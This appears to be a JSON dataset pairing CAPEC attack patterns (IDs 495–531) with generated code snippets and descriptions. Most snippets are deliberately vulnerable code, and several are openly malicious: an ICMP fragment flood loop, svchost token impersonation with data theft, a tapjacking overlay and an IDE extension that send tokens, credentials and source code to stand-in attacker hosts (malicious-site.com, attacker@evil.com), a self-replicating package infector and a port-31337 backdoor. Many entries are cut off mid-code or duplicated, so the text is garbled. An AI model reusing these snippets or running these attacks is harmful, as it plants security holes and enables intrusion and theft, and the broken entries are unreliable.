security controls.\"",
        "description": "\"This code demonstrates a vulnerable TCP fragmentation implementation that splits TCP headers across multiple fragments to potentially bypass filtering. It includes resource exhaustion (CWE-770) by not limiting connections, improper resource cleanup (CWE-404) by not closing sockets, and sends data in cleartext (CWE-319). The fragmentation manipulates TCP headers to push flags into the second fragment, which may bypass security controls.\""
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport sys\n\ndef udp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind(('0.0.0.0', 12345))\n    \n    fragments = {}\n    \n    while True:\n        try:\n            data, addr = server_socket.recvfrom(65535)\n            # No limit on number of fragments stored\n            if addr not in fragments:\n                fragments[addr] = []\n            fragments[addr].append(data)\n            \n            # Attempt to reassemble fragments without size checks\n            reassembled = b''.join(fragments[addr])\n            \n            # Process reassembled data without validation\n            process_data(reassembled)\n            \n        except Exception as e:\n            continue\n            \ndef process_data(data):\n    # Vulnerable processing of potentially large data\n    temp_buffer = bytearray(len(data) * 2)\n    temp_buffer[:len(data)] = data",
        "description": "This code demonstrates a vulnerable UDP server that accepts large fragmented packets without proper resource controls. It has multiple vulnerabilities: unlimited allocation of memory for storing fragments (CWE-770), no cleanup of stored fragments (CWE-404), no validation of fragment sizes or counts (CWE-406), and unsafe handling of potentially highly compressed data (CWE-409). The server processes all incoming UDP fragments without any rate limiting or size restrictions, making it susceptible to resource exhaustion attacks."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "\"\"\"\nimport socket\nimport ipaddress\nfrom scapy.all import *\n\ndef launch_icmp_fragment_attack(target_ip, num_packets=1000):\n    # Create a large ICMP message\n    icmp_data = b'A' * 1500\n    \n    # Fragment size with incorrect offset\n    fragment_size = 500\n    \n    for _ in range(num_packets):\n        # Craft IP packet with incorrect fragment sizes\n        ip_packet = IP(dst=target_ip)\n        ip_packet.flags = 'MF'  # More Fragments flag\n        ip_packet.frag = 1337   # Incorrect fragment offset\n        \n        # Attach ICMP payload\n        icmp_packet = ICMP()/Raw(load=icmp_data)\n        \n        # Combine and send without resource limits\n        fragmented_packet = ip_packet/icmp_packet\n        send(fragmented_packet, verbose=False)\n        \n        # No delay between packets to overwhelm target\n        \nif __name__ == \\\"__main__\\\":\n    target = '10.0.0.1'\n    while True:  # Continuous attack without limits\n        launch_icmp_fragment_attack(target)\n        # No resource cleanup or release\"\"\",\n    \"description\": \"This code demonstrates a vulnerable implementation of an ICMP fragmentation attack. It creates malformed ICMP packets with incorrect fragment sizes and offsets, sends them continuously without rate limiting, and lacks proper resource management. The code exhibits CWE-770 by not limiting resource allocation, CWE-404 by not properly releasing network resources, and operates without proper controls or error handling.\"",
        "description": "\"This code demonstrates a vulnerable implementation of an ICMP fragmentation attack. It creates malformed ICMP packets with incorrect fragment sizes and offsets, sends them continuously without rate limiting, and lacks proper resource management. The code exhibits CWE-770 by not limiting resource allocation, CWE-404 by not properly releasing network resources, and operates without proper controls or error handling.\""
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "def read_config_file(user_input):\n    base_path = '/etc/app/'\n    config_file = user_input + '.conf'\n    full_path = base_path + config_file\n    \n    try:\n        with open(full_path, 'r') as f:\n            config_data = f.read()\n            return config_data\n    except FileNotFoundError:\n        return 'Config file not found'\n\ndef process_uploaded_file(filename):\n    if filename.endswith('.conf'):\n        with open(f'/uploads/{filename}', 'r') as f:\n            return f.read()\n    \ndef list_config_files():\n    import os\n    config_path = '/etc/app/'\n    files = os.listdir(config_path)\n    return [f for f in files if f.endswith('.conf')]",
        "description": "This vulnerable code allows unrestricted access to configuration files through directory traversal and unsafe file operations. It exposes sensitive configuration files through direct user input in file paths, doesn't properly validate file names, and allows listing of configuration files without proper access control. The code also makes unsafe assumptions about file types based on extensions."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "\"\"\"\nimport os\nfrom PIL import ImageGrab\nimport time\n\nclass BackgroundScreenshotManager:\n    def __init__(self):\n        self.screenshot_dir = os.path.expanduser('~/temp_screenshots/')\n        if not os.path.exists(self.screenshot_dir):\n            os.makedirs(self.screenshot_dir)\n\n    def capture_app_state(self, app_id):\n        # Take screenshot when app goes to background\n        screenshot = ImageGrab.grab()\n        filename = f'app_{app_id",
        "description": "\"This code demonstrates a vulnerable implementation of an iOS-style background screenshot management system. It captures screenshots when apps transition to the background and inappropriately stores sensitive information in plaintext within the screenshot files. The code lacks proper access controls, stores sensitive data in an insecure location, and doesn't implement any authorization checks for accessing the stored screenshots.\""
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "\"\"\"\nfrom android import Intent, BroadcastReceiver, Context\nimport android.content as content\n\nclass VulnerableReceiver(BroadcastReceiver):\n    def onReceive(self, context, intent):\n        # No verification of sender's identity or data integrity\n        sensitive_data = intent.getStringExtra(\"user_credentials\")\n        account_number = intent.getStringExtra(\"account_number\")\n        \n        # Process and forward sensitive data using implicit intent\n        forward_intent = Intent()\n        forward_intent.setAction(\"com.bank.PROCESS_PAYMENT\")\n        forward_intent.putExtra(\"credentials\", sensitive_data)\n        forward_intent.putExtra(\"account\", account_number)\n        \n        # Sending sensitive data via implicit intent without permissions\n        context.sendBroadcast(forward_intent)\n\nclass PaymentActivity:\n    def sendPaymentDetails(self, amount, account):\n        # Creating implicit intent with sensitive data\n        intent = Intent()\n        intent.setAction(\"com.bank.PAYMENT_ACTION\")\n        intent.putExtra(\"amount\", str(amount))\n        intent.putExtra(\"account_number\", account)\n        \n        # Sending unprotected broadcast with sensitive information\n        self.sendBroadcast(intent)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable Android intent handling where sensitive data is transmitted using implicit intents without proper verification, permissions, or encryption. The broadcast receiver accepts intents without verifying the sender, and sensitive data is transmitted in cleartext through broadcast messages that can be intercepted by malicious applications.\"",
        "description": "\"This code demonstrates vulnerable Android intent handling where sensitive data is transmitted using implicit intents without proper verification, permissions, or encryption. The broadcast receiver accepts intents without verifying the sender, and sensitive data is transmitted in cleartext through broadcast messages that can be intercepted by malicious applications.\""
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "\"\"\"\nimport webview\nimport urllib.parse\n\nclass VulnerableWebApp:\n    def __init__(self):\n        self.cookies = {",
        "description": "\"This code demonstrates a vulnerable WebView implementation that exposes dangerous JavaScript interfaces, lacks proper request origin validation, allows arbitrary code execution, and relies on client-side security controls. The WebView can be manipulated by malicious code to access sensitive data through exposed methods, execute arbitrary JavaScript, and bypass cookie validation.\""
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "\"\"\"\nfrom android import Intent, Activity, BroadcastReceiver\n\nclass VulnerableActivity(Activity):\n    def send_sensitive_data(self, data):\n        # Creating an implicit intent without proper verification\n        intent = Intent()\n        intent.setAction(\"com.example.SEND_SENSITIVE_DATA\")\n        intent.putExtra(\"sensitive_data\", data)\n        # Broadcasting sensitive data using implicit intent\n        self.sendBroadcast(intent)\n\nclass UnsafeBroadcastReceiver(BroadcastReceiver):\n    def onReceive(self, context, intent):\n        # No verification of intent source\n        sensitive_data = intent.getStringExtra(\"sensitive_data\")\n        # Process sensitive data without validating sender\n        self.process_data(sensitive_data)\n        \n    def process_data(self, data):\n        # Handle sensitive data without proper verification\n        pass\n\n# AndroidManifest.xml export configuration (represented in code)\n'''\n<activity android:name=\".VulnerableActivity\" android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.SEND_SENSITIVE_DATA\" />\n        <category android:name=\"android.intent.category.DEFAULT\" />\n    </intent-filter>\n</activity>\n'''\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable Android components that use implicit intents for sensitive communication without proper verification. The activity broadcasts sensitive data using an implicit intent, while the broadcast receiver accepts and processes data without verifying the sender's identity. The components are also exported without proper restrictions, allowing potential malicious applications to intercept or inject malicious intents.\"",
        "description": "\"This code demonstrates vulnerable Android components that use implicit intents for sensitive communication without proper verification. The activity broadcasts sensitive data using an implicit intent, while the broadcast receiver accepts and processes data without verifying the sender's identity. The components are also exported without proper restrictions, allowing potential malicious applications to intercept or inject malicious intents.\""
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "\"\"\"\nimport android.content.BroadcastReceiver\nimport android.content.Context\nimport android.content.Intent\n\nclass SensitiveBroadcastReceiver(BroadcastReceiver):\n    def onReceive(self, context: Context, intent: Intent):\n        # Vulnerable: No verification of intent source\n        user_data = intent.getStringExtra(\"sensitive_data\")\n        account_info = intent.getStringExtra(\"account_info\")\n        \n        # Process sensitive data without validation\n        process_user_data(user_data)\n        update_account(account_info)\n\n    def process_user_data(self, data):\n        # Vulnerable: Processing potentially malicious data\n        with open(\"user_data.txt\", \"w\") as f:\n            f.write(data)\n\n    def update_account(self, info):\n        # Vulnerable: Updating account without authentication\n        database.update_user_account(info)\n\n# AndroidManifest.xml snippet:\n# <receiver android:name=\".SensitiveBroadcastReceiver\" android:exported=\"true\">\n#     <intent-filter>\n#         <action android:name=\"com.example.SENSITIVE_ACTION\" />\n#     </intent-filter>\n# </receiver>\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable Android broadcast receiver that accepts and processes sensitive data from any intent without proper verification of the sender. The component is explicitly exported, making it accessible to any application on the device. It processes sensitive user data and performs account updates without authentication or validation, making it susceptible to unauthorized access and data injection attacks.\"",
        "description": "\"This code demonstrates a vulnerable Android broadcast receiver that accepts and processes sensitive data from any intent without proper verification of the sender. The component is explicitly exported, making it accessible to any application on the device. It processes sensitive user data and performs account updates without authentication or validation, making it susceptible to unauthorized access and data injection attacks.\""
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template_string\nfrom webview import WebView\n\napp = Flask(__name__)\n\nclass JavaScriptInterface:\n    def executeCommand(self, cmd):\n        import os\n        return os.popen(cmd).read()\n\n    def getPrivateData(self):\n        return \"sensitive_data_here\"\n\n@app.route('/')\ndef index():\n    webview = WebView()\n    interface = JavaScriptInterface()\n    # Unsafe: Exposing dangerous methods to JavaScript\n    webview.addJavascriptInterface(interface, 'androidInterface')\n    \n    html = '''\n    <html>\n        <body>\n            <script>\n                function runCommand() {\n                    var result = androidInterface.executeCommand('ls');\n                    document.getElementById('output').innerHTML = result;",
        "description": "\"This code demonstrates a vulnerable implementation where dangerous methods are exposed to JavaScript through WebView's addJavascriptInterface. The interface allows execution of arbitrary commands and access to sensitive data without proper access controls. Any web page loaded in the WebView can access these methods, making it susceptible to cross-site scripting attacks and unauthorized access.\""
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "\"\"\"\nimport win32com.client\nimport win32security\nimport subprocess\nimport os\n\nclass TaskImpersonator:\n    def __init__(self):\n        self.token = None\n        \n    def impersonate_system_task(self):\n        # Impersonate a legitimate system process\n        try:\n            system_process = win32com.client.GetObject('winmgmts:').Get('Win32_Process.Name=\"svchost.exe\"')\n            process_token = win32security.OpenProcessToken(system_process._handle, win32security.TOKEN_DUPLICATE)\n            self.token = win32security.DuplicateToken(process_token)\n            win32security.ImpersonateLoggedOnUser(self.token)\n            \n            # Perform malicious actions with elevated privileges\n            self._steal_sensitive_data()\n            self._install_backdoor()\n            \n        except Exception as e:\n            pass\n            \n    def _steal_sensitive_data(self):\n        sensitive_paths = [os.path.expanduser('~/Documents'), '/etc/passwd']\n        for path in sensitive_paths:\n            if os.path.exists(path):\n                with open('stolen_data.txt', 'a') as f:\n                    f.write(f'Data from {path",
        "description": "\"This code demonstrates a malicious implementation that impersonates a legitimate system task (svchost.exe) to elevate privileges. It then uses these privileges to steal sensitive data and install a backdoor. The code exploits improper authorization checks and identity impersonation vulnerabilities to perform unauthorized actions with elevated access rights.\""
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "\"\"\"\nimport webbrowser\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport urllib.parse\nimport re\n\nclass MaliciousURLHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed_path = urllib.parse.urlparse(self.path)\n        params = urllib.parse.parse_qs(parsed_path.query)\n        \n        if 'target_app' in params:\n            # Register as handler for target app's URL scheme\n            target_scheme = params['target_app'][0]\n            \n            # Create phishing page that mimics target app\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            \n            phishing_form = f'''\n            <html><body style='font-family: Arial;'>\n                <h2>{target_scheme",
        "description": "\"This code demonstrates a malicious URL scheme handler that intercepts requests intended for a target application. It creates a phishing page that mimics the target app's login form, collects sensitive credentials via GET requests, stores them locally, and redirects users to avoid suspicion. The code exploits improper URL scheme handling, uses GET requests with sensitive data, and implements open redirects.\""
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "\"\"\"\nfrom tkinter import *\nimport webbrowser\n\nclass MaliciousOverlay:\n    def __init__(self):\n        # Create transparent overlay window\n        self.root = Tk()\n        self.root.attributes('-alpha', 0.1)  # Almost invisible\n        self.root.attributes('-topmost', True)\n        self.root.geometry('400x600')\n        \n        # Create invisible button that captures clicks\n        self.hidden_button = Button(self.root, text='', command=self.on_click)\n        self.hidden_button.configure(background='white', borderwidth=0)\n        self.hidden_button.place(x=180, y=300, width=40, height=40)\n        \n        # Create legitimate-looking background\n        self.background = Toplevel()\n        self.background.geometry('400x600')\n        self.background.title('Secure Banking App')\n        Label(self.background, text='Balance: $1,000.00').pack(pady=20)\n        Button(self.background, text='Transfer Money').place(x=150, y=300)\n\n    def on_click(self):\n        # Malicious action when user clicks\n        webbrowser.open('http://malicious-site.com/steal?token=' + self.get_user_token())\n        \n    def get_user_token(self):\n        return 'user_session_token'  # Normally stored securely\n        \n    def run(self):\n        self.root.mainloop()\n\nif __name__ == '__main__':\n    overlay = MaliciousOverlay()\n    overlay.run()\n\"\"\",\n    \"description\": \"A malicious implementation that creates a transparent overlay window with an invisible button positioned over a legitimate-looking banking application interface. When users attempt to interact with what appears to be the legitimate application, their clicks are intercepted by the invisible overlay, redirecting them to a malicious site while transmitting sensitive information in cleartext.\"",
        "description": "\"A malicious implementation that creates a transparent overlay window with an invisible button positioned over a legitimate-looking banking application interface. When users attempt to interact with what appears to be the legitimate application, their clicks are intercepted by the invisible overlay, redirecting them to a malicious site while transmitting sensitive information in cleartext.\""
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "\"\"\"\nimport os\nimport json\nimport sqlite3\n\nclass InsecureDataStorage:\n    def __init__(self):\n        self.db_path = 'sensitive_data.db'\n        self.temp_file = 'system_info.txt'\n        \n    def store_sensitive_data(self, username, password, api_key):\n        # Store sensitive data in plain text files without access controls\n        with open('credentials.txt', 'w') as f:\n            f.write(f'Username: {username",
        "description": "\"This code demonstrates multiple security vulnerabilities related to physical access and insecure storage of sensitive information. It stores credentials and system information in plaintext files without access controls, creates an unprotected SQLite database with sensitive data, and exposes system information in world-readable files. The code lacks any protection mechanisms against physical access or side-channel attacks, making it vulnerable to theft and unauthorized access of the stored sensitive information.\""
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "\"\"\"\ndef login_system():\n    username = input('Enter username: ')\n    password = input('Enter password: ')  # Plain text password input\n    \n    # Display sensitive information on screen\n    print(f'Checking credentials for: {username",
        "description": "\"This vulnerable code demonstrates multiple issues that make it susceptible to shoulder surfing attacks. It displays passwords and sensitive information in plaintext on the screen, stores credentials in clear text, and openly shows system configuration details. The code violates multiple security principles by exposing sensitive information that could be easily observed by someone looking over a user's shoulder.\""
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "\"\"\"\nimport ldap3\nimport hashlib\nfrom kerberos import getCredentialsCache\nimport spnego\n\ndef authenticate_service(username, password):\n    # Vulnerable service authentication implementation\n    service_principal = f'HTTP/service.example.com@REALM'\n    \n    # Store service tickets in plaintext\n    tickets_cache = {",
        "description": "\"This vulnerable code demonstrates a flawed Kerberos service authentication implementation that stores service tickets insecurely, uses weak password hashing, lacks ticket expiration checks, and implements single-factor authentication with weak password requirements. The code is susceptible to ticket capture-replay attacks and credential theft through SPN scanning and ticket cracking.\""
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "\"\"\"\nclass CloudService:\n    def __init__(self):\n        self.sessions = {",
        "description": "\"This vulnerable code demonstrates a cloud service implementation that fails to properly validate request origins, lacks proper authorization checks, and relies on client-side security. The malicious application exploits an authenticated session by piggybacking on a trusted user's credentials to execute unauthorized actions. The code contains multiple vulnerabilities including improper authorization, origin validation errors, and client-side enforcement of server-side security.\""
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport smtplib\nimport shutil\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\ndef debug_log(msg, debug=True):\n    if debug:\n        with open('debug.log', 'a') as f:\n            f.write(f'API_KEY={os.environ.get(\"API_KEY\")}\\n')\n            f.write(f'DB_PASSWORD={os.environ.get(\"DB_PASSWORD\")}\\n')\n            f.write(msg + '\\n')\n\nclass IDEExtension:\n    def __init__(self):\n        self.email_server = 'smtp.attacker.com'\n        self.attacker_email = 'attacker@evil.com'\n    \n    def process_upload(self, file_path):\n        if file_path.endswith(('.py', '.exe', '.dll')):\n            shutil.copy2(file_path, os.path.join(os.getenv('APPDATA'), 'autorun.exe'))\n            self.exfiltrate_data()\n    \n    def exfiltrate_data(self):\n        sensitive_data = {\n            'source_code': open('project/source.py').read(),\n            'credentials': open('config/credentials.ini').read(),\n            'env_vars': str(dict(os.environ))\n        }\n        \n        msg = MIMEMultipart()\n        msg['From'] = 'ide@company.com'\n        msg['To'] = self.attacker_email\n        msg.attach(MIMEText(str(sensitive_data)))\n        \n        with smtplib.SMTP(self.email_server) as server:\n            server.send_message(msg)",
        "description": "This vulnerable code demonstrates an IDE extension that allows unrestricted file uploads, writes sensitive information to debug logs, and includes embedded malicious code that exfiltrates sensitive system information including source code, credentials, and environment variables to an attacker-controlled email server."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "\"\"\"\nimport hardware_interface\nfrom third_party_components import baseline_sensor\nfrom calibration_utils import calibrate_system\n\nclass VulnerableProductDevelopment:\n    def __init__(self):\n        self.baseline_component = None\n        self.calibration_data = {",
        "description": "\"This code demonstrates a vulnerable product development system that fails to verify the authenticity and integrity of hardware components during calibration and deployment. It blindly trusts third-party components, lacks voltage glitch protection, and doesn't implement component validation or update mechanisms. The system is susceptible to hardware substitution attacks during the development phase.\""
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "\"\"\"\nclass ProductDocumentation:\n    def __init__(self):\n        self.technical_specs = {",
        "description": "\"This vulnerable code demonstrates a documentation management system that fails to properly control access to technical specifications and dial-down configurations. It allows unauthorized modification of product specifications, doesn't verify document integrity, truncates security logs, and exposes sensitive information through uncontrolled exports. The code lacks proper authentication, allows direct manipulation of technical specifications, and doesn't implement restrictions for advanced technology access.\""
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemConfiguration:\n    def __init__(self):\n        self.config = {}\n        self.documentation = {}\n        self._load_documentation()\n    \n    def _load_documentation(self):\n        try:\n            with open('system_docs.txt', 'r') as f:\n                self.documentation = eval(f.read())\n        except:\n            self.documentation = {}\n    \n    def update_documentation(self, section, content):\n        # No authentication or validation\n        self.documentation[section] = content\n        # Directly write changes without access control\n        with open('system_docs.txt', 'w') as f:\n            f.write(str(self.documentation))\n    \n    def configure_system(self):\n        # Directly uses documentation for system configuration\n        for feature, spec in self.documentation.items():\n            # Dangerous: Using eval on documentation contents\n            self.config[feature] = eval(spec.get('implementation', ''))\n            \n    def get_system_info(self):\n        # Exposes sensitive system configuration\n        return {\n            'config': self.config,\n            'kernel_version': os.uname(),\n            'system_paths': sys.path,\n            'env_vars': os.environ\n        }",
        "description": "This code demonstrates vulnerable documentation handling where system documentation can be maliciously modified without proper authentication, leading to insecure system configuration. It uses unsafe practices like eval() on documentation content, exposes sensitive system information, and lacks proper validation of documentation changes. The code directly implements low-level system operations based on potentially tampered documentation, which could lead to system compromise."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self):\n        self.specifications = {}\n        self.load_specifications()\n    \n    def load_specifications(self):\n        try:\n            with open('system_specs.txt', 'r') as f:\n                for line in f:\n                    key, value = line.strip().split('=')\n                    # Dangerous: No validation of loaded specifications\n                    self.specifications[key] = eval(value)\n    \n    def configure_component(self):\n        # Blindly applying specifications without verification\n        for spec, value in self.specifications.items():\n            setattr(self, spec, value)\n    \n    def execute_operation(self, operation_name):\n        # Dynamically executing operations based on specifications\n        if operation_name in self.specifications:\n            operation = self.specifications[operation_name]\n            if callable(operation):\n                return operation()\n            return operation",
        "description": "This code demonstrates vulnerable documentation-based attack vectors by implementing a system that blindly loads and executes specifications from an external file. It uses dangerous eval() to parse values and dynamically sets attributes without validation, allowing an attacker who can modify the specification file to inject malicious code or alter system behavior. The code lacks proper validation, documentation checks, and secure specification handling."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import os\nimport socket\n\nclass SecureComponent:\n    def __init__(self):\n        self._backdoor_active = False\n        self._secret_key = b'malicious_key_123'\n    \n    def initialize(self):\n        # Legitimate-looking component initialization\n        print('Initializing secure component...')\n        if self._check_activation_signal():\n            self._backdoor_active = True\n    \n    def _check_activation_signal(self):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.bind(('0.0.0.0', 31337))\n            sock.settimeout(0.1)\n            data, _ = sock.recvfrom(1024)\n            return data == self._secret_key\n        except:\n            return False\n    \n    def process_data(self, data):\n        if self._backdoor_active:\n            # Covert channel for data exfiltration\n            with open('/tmp/.hidden_log', 'ab') as f:\n                f.write(data)\n        return data  # Return unmodified data to appear legitimate",
        "description": "This code represents a counterfeit hardware component's software implementation masquerading as a legitimate secure component. It contains hidden functionality that activates when receiving a specific network signal, creating a covert channel for data exfiltration while maintaining normal appearance. The component appears trustworthy but includes undocumented features that can be exploited by malicious actors."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "\"\"\"\nclass HardwareDesignSpec:\n    def __init__(self):\n        self.debug_enabled = True\n        self.lock_bit = False\n        self.register_defaults = {\n            'security_level': 0,\n            'access_control': 'disabled',\n            'debug_mode': 'full_access'",
        "description": "\"A vulnerable hardware design specification implementation that allows modification of critical security parameters, demonstrates improper lock bit protection, insufficient documentation validation, and insecure debug chain configuration. The code allows attackers to manipulate register defaults and security settings post-deployment.\""
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareController:\n    def __init__(self):\n        self.trusted_components = {\n            'sensor': 'genuine_sensor_v1',\n            'processor': 'genuine_proc_v2',\n            'memory': 'genuine_mem_v1'\n        }\n        self.firmware_versions = {}\n        self.initialize_components()\n    \n    def initialize_components(self):\n        for component, model in self.trusted_components.items():\n            # No verification of component authenticity\n            self.firmware_versions[component] = self._get_firmware(model)\n    \n    def _get_firmware(self, model):\n        # Blindly trusts the firmware without verification\n        return f'firmware_{model}_1.0'\n    \n    def process_data(self, input_data):\n        # No validation of component integrity\n        if self.trusted_components['processor'] in self.firmware_versions:\n            # Potentially compromised component processes sensitive data\n            processed_data = self._process_with_component(input_data)\n            return processed_data\n        return None\n    \n    def _process_with_component(self, data):\n        # Could be running on counterfeit hardware\n        return data + '_processed'",
        "description": "This vulnerable code demonstrates a hardware control system that fails to properly verify the authenticity and integrity of its components. It blindly trusts hardware components and their firmware without validation, making it susceptible to supply chain attacks where malicious hardware could be substituted. The code lacks proper component verification, firmware validation, and hardware authentication mechanisms, allowing counterfeit or tampered hardware to operate within the system without detection."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\nimport sys\nimport os\n\ndef download_and_install_package(package_url):\n    try:\n        # Download seemingly legitimate package\n        response = requests.get(package_url)\n        package_name = 'legitimate_package.py'\n        \n        with open(package_name, 'wb') as f:\n            f.write(response.content)\n            \n        # Malicious code injection\n        with open(package_name, 'a') as f:\n            f.write('\n# Malicious payload\ndef background_task():\\n    while True:\\n        try:\\n            # Create hidden file for persistence\\n            with open(\".sys_config\", \"w\") as sf:\\n                sf.write(\"STARTUP=1\")\\n            # Replicate to other paths\\n            for root, dirs, files in os.walk(\".\"):\\n                for f in files:\\n                    if f.endswith(\".py\"):\\n                        inject_payload(os.path.join(root, f))\\n        except: pass\\n\\nimport threading\\nt = threading.Thread(target=background_task, daemon=True)\\nt.start()')\n        \n        # Execute the package\n        __import__(package_name[:-3])\n        return True\n    except:\n        return False\n\ndef inject_payload(target_file):\n    with open(target_file, 'a') as f:\n        f.write('\\n# Infected\\n')",
        "description": "This code demonstrates a supply chain attack where a seemingly legitimate package is downloaded but is modified during installation to include malicious code. The malicious code self-replicates to other Python files and maintains persistence through hidden files. It represents a combination of embedded malicious code, replicating behavior, and unauthorized modification of system resources."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "\"\"\"\nimport sqlite3\nimport subprocess\nimport importlib.util\nfrom urllib import request\n\ndef setup_database():\n    conn = sqlite3.connect('system.db')\n    cursor = conn.cursor()\n    sql = \"CREATE TABLE IF NOT EXISTS components (name TEXT, binary_data BLOB)\"\n    cursor.execute(sql)\n    return conn\n\ndef download_and_inject_component(url, name):\n    # Download component from untrusted source\n    response = request.urlopen(url)\n    binary_data = response.read()\n    \n    # Store component without validation\n    conn = setup_database()\n    cursor = conn.cursor()\n    sql = f\"INSERT INTO components VALUES ('{name",
        "description": "\"This code demonstrates a vulnerable component integration system that downloads, stores, and executes components from untrusted sources without proper validation. It includes SQL injection vulnerabilities, unsafe dynamic loading of Python modules, and execution of untrusted code through shell commands. The code fails to validate input, allows direct execution of downloaded code, and uses unsafe SQL queries.\""
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nimport xml.etree.ElementTree as ET\nimport threading\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.data\n    try:\n        # No input validation or size restrictions\n        tree = ET.fromstring(xml_data)\n        \n        # Vulnerable to entity expansion\n        for elem in tree.iter():\n            # Process each element without any rate limiting\n            threading.Thread(target=process_element, args=(elem,)).start()\n            \n        return \"XML processed successfully\", 200\n    except Exception as e:\n        return str(e), 500\n\ndef process_element(elem):\n    # CPU-intensive processing without limits\n    for _ in range(10000):\n        str(elem) + str(elem)\n\nif __name__ == '__main__':\n    app.run(threaded=True)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable XML processing web service that's susceptible to XML-based DoS attacks. It lacks input validation, size restrictions, and entity expansion controls. The code spawns unlimited threads for each XML element and performs resource-intensive operations without any rate limiting or timeout mechanisms. It's vulnerable to XML bomb attacks, recursive entity expansion, and memory exhaustion through unlimited thread creation.\"",
        "description": "\"This code demonstrates a vulnerable XML processing web service that's susceptible to XML-based DoS attacks. It lacks input validation, size restrictions, and entity expansion controls. The code spawns unlimited threads for each XML element and performs resource-intensive operations without any rate limiting or timeout mechanisms. It's vulnerable to XML bomb attacks, recursive entity expansion, and memory exhaustion through unlimited thread creation.\""
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "\"\"\"\nimport os\nimport platform\nimport socket\nimport shutil\nimport subprocess\nimport psutil\nfrom pathlib import Path\n\nclass SystemInfoCollector:\n    def __init__(self):\n        self.home = str(Path.home())\n        self.data = {",
        "description": "\"This code represents malware that collects sensitive system information, user data, and browser history without authorization. It demonstrates information gathering about system configuration, self-replication capabilities, and covert data exfiltration to a remote server. The code includes spyware functionality by collecting user data without consent and implements virus-like behavior through self-replication to multiple system locations.\""
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\nimport hashlib\n\ndef download_third_party_component(url):\n    response = requests.get(url)\n    component = response.content\n    return component\n\ndef verify_component_authenticity(component, expected_hash):\n    calculated_hash = hashlib.sha256(component).hexdigest()\n    return calculated_hash == expected_hash\n\ndef install_component(component):\n    # Simulated installation without proper verification\n    if b'VALID' in component:\n        with open('system_component.dll', 'wb') as f:\n            f.write(component)\n        return True\n    return False\n\ndef update_system():\n    component_url = 'http://third-party-supplier.com/component.dll'\n    expected_hash = 'known_good_hash'  # Hardcoded hash, not regularly updated\n    \n    component = download_third_party_component(component_url)\n    \n    # Weak verification that could be bypassed\n    if verify_component_authenticity(component, expected_hash):\n        install_component(component)\n    else:\n        # Fallback to installation without proper verification\n        install_component(component)",
        "description": "This code demonstrates vulnerable third-party component handling where a system downloads and installs components without proper verification. It includes weak hash verification that could be bypassed, and falls back to installing unverified components. An attacker could exploit this by intercepting the download process and replacing the legitimate component with a malicious one, or by compromising the third-party supplier's distribution channel. The code also shows hard-coded security identifiers and insufficient trust verification, making it susceptible to supply chain attacks."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
